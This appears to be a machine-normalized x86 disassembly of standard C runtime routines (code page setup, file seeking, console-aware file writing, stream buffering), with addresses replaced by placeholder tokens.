sub_41ffca
push 0xc
push r--data
call sub_415ff4
call sub_41a075
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420065
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_416039
retn
push 0x20
call sub_418293
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_415093
pop ecx
sub_42006e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_41c653
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4200ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42006e
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_41fdd3
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_415f60
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_41fda4
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_41fe37
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_415f60
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_41fda4
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_4202cf
push 0x14
push r--data
call sub_415ff4
or [ ebp - 0x20 ] 0xffffffff
call sub_41a075
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_41ffca
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_42006e
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_41a9de
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_416039
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_4200ea
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_4162ac
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_415093
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_415093
pop ecx
push 0xd
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420430
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_415093
pop ecx
sub_420487
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_420504
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420524
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_414a33
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_420569
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_420569
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_420524
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_420619
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_420638
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_420610
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_420619
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_42063b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_42270a
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_42068c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42063b
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_4206ba
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_415093
pop ecx
sub_4206da
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_422882
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_4162ac
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_4162d2
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_42075f
push 0x14
push r--data
call sub_415ff4
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_4162bf
and [ eax ] 0x0
call sub_4162ac
mov [ eax ] 0x9
call sub_4162bf
mov [ eax ] edi
call sub_4162ac
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_416039
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_4228f9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4162bf
mov [ eax ] edi
call sub_4162ac
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_4162ac
mov [ eax ] 0x9
call sub_4162bf
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4206da
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42086e
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_420878
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_4185c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_4162bf
mov [ eax ] esi
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_414a33
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_4162bf
xor esi esi
mov [ eax ] esi
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4210d0
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4206da
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_41a075
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_4162ac
mov [ eax ] 0x1c
call sub_4162bf
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_4162d2
pop ecx
jmp r-xdata
call sub_4162ac
mov [ eax ] 0x9
call sub_4162bf
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_421621
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_4229c0
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_4215cf
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_4215cf
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_4229c0
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_420fab
push 0x10
push r--data
call sub_415ff4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_4162bf
and [ eax ] 0x0
call sub_4162ac
mov [ eax ] 0x9
call sub_4162bf
mov [ eax ] edi
call sub_4162ac
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_416039
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4228f9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4162ac
mov [ eax ] 0x9
call sub_4162bf
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420878
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42107d
mov eax [ ebp - 0x1c ]
sub_421087
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_41a9de
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_4210d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_4162ac
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_4153b1
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_42113a
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_41aa23
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
